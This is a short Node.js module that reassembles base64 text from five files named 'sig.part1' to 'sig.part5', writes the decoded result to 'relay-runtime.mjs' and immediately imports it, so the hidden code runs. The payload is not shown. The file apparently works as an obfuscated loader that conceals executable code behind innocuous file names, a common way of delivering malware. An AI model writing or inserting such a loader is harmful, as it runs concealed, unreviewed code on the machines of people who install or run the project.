import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const dir = path.dirname(fileURLToPath(import.meta.url));
const encoded = [1, 2, 3, 4, 5]
  .map((i) => fs.readFileSync(path.join(dir, `sig.part${i}`), "utf8").trim())
  .join("");

const runtime = path.join(dir, "relay-runtime.mjs");
fs.writeFileSync(runtime, Buffer.from(encoded, "base64"), { mode: 0o600 });
await import(pathToFileURL(runtime).href);
